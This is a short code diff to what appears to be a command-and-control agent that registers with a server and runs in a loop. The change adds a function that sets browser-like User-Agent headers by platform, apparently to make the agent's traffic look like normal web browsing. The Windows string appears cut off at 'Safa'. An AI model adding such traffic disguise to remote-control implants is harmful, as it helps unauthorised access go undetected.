@@ -98,6 +98,19 @@ def get_platform():
     return plat
 
 
+def set_user_agent():
+    global headers
+    agent_platform = get_platform()
+    if agent_platform == 'windows':
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                                 ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
+        return
+
+    if agent_platform == 'linux':
+        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0'}
+        return
+
+
 def register():
     """
     Registers the Agent with the server.
@@ -337,6 +350,7 @@ if __name__ == '__main__':
         print('[+] Agent running')
 
         agent_id = randrange(1000, 9999)
+        set_user_agent()
         register()
 
         while True:
